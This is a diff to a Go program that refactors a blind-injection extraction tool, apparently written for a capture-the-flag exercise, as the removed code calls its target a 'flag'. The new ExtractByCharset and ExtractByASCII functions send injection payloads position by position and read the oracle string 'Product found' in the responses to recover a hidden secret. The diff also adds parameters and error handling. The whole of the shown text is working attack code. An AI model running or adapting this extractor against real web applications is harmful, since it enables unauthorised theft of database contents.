@@ -147,51 +147,90 @@ func buildASCIIEqualsPayload(position int, code int) string {
 	)
 }
 
-func (c *HTTPClient) extractingPayloadByCharset() string {
-	flagLength := 21
-	var result string
+func (c *HTTPClient) ExtractByCharset(maxLen int, charset string) (string, error) {
+	if maxLen <= 0 {
+		return "", errors.New("maxLen must be positive")
+	}
 
-	for i := 1; i <= flagLength; i++ {
-		for _, ch := range DefaultCharset {
-			payload := buildCharEqualsPayload(i, ch)
+	if strings.TrimSpace(charset) == "" {
+		return "", errors.New("charset cannot be empty")
+	}
+
+	var result strings.Builder
+
+	for position := 1; position <= maxLen; position++ {
+		found := false
+
+		for _, ch := range charset {
+			payload := buildCharEqualsPayload(position, ch)
+
 			obs, err := c.SendPayload(payload)
 			if err != nil {
-				fmt.Fprintln(os.Stderr, err)
-				continue
+				return "", fmt.Errorf("send payload at position %d char %q: %w", position, ch, err)
 			}
 
-			ok := bodyContainsOracle(obs, "Product found")
-			if ok {
-				result += string(ch)
+			if bodyContainsOracle(obs, "Product found") {
+				result.WriteRune(ch)
+				found = true
+				fmt.Println("[+]", result.String())
 				break
 			}
 		}
+
+		if !found {
+			break
+		}
 	}
-	return result
+
+	return result.String(), nil
 }
 
-func (c *HTTPClient) extractingPayloadByASCII() string {
-	flagLength := 21
-	var result string
+func (c *HTTPClient) ExtractByASCII(maxLen int, minCode int, maxCode int) (string, error) {
+	if maxLen <= 0 {
+		return "", errors.New("maxLen must be positive")
+	}
 
-	for i := 1; i <= flagLength; i++ {
+	if minCode <= 0 {
+		return "", errors.New("minCode must be positive")
+	}
 
-		for j := ASCIIMin; j <= ASCIIMax; j++ {
-			payload := buildASCIIEqualsPayload(i, j)
+	if maxCode <= 0 {
+		return "", errors.New("maxCode must be positive")
+	}
+
+	if minCode > maxCode {
+		return "", errors.New("minCode cannot be greater than maxCode")
+	}
+
+	var result strings.Builder
+
+	for position := 1; position <= maxLen; position++ {
+		found := false
+
+		for code := minCode; code <= maxCode; code++ {
+			payload := buildASCIIEqualsPayload(position, code)
+
 			obs, err := c.SendPayload(payload)
 			if err != nil {
-				fmt.Fprintln(os.Stderr, err)
-				continue
+				return "", fmt.Errorf("send payload at position %d code %d: %w", position, code, err)
 			}
 
 			ok := bodyContainsOracle(obs, "Product found")
 			if ok {
-				result += string(j)
+				result.WriteRune(rune(code))
+				found = true
+
+				fmt.Println("[+] Current result:", result.String())
 				break
 			}
 		}
+
+		if !found {
+			break
+		}
 	}
-	return result
+
+	return result.String(), nil
 }
 
 func main() {
@@ -220,6 +259,19 @@ func main() {
 		fmt.Println()
 	}
 
-	fmt.Println("Charset extracting flag:", client.extractingPayloadByCharset())
-	fmt.Println("ASCII extracting flag:", client.extractingPayloadByASCII())
+	charsetSecret, err := client.ExtractByCharset(21, DefaultCharset)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+
+	fmt.Println("Charset extracted secret:", charsetSecret)
+
+	asciiSecret, err := client.ExtractByASCII(21, ASCIIMin, ASCIIMax)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+
+	fmt.Println("ASCII extracted secret:", asciiSecret)
 }
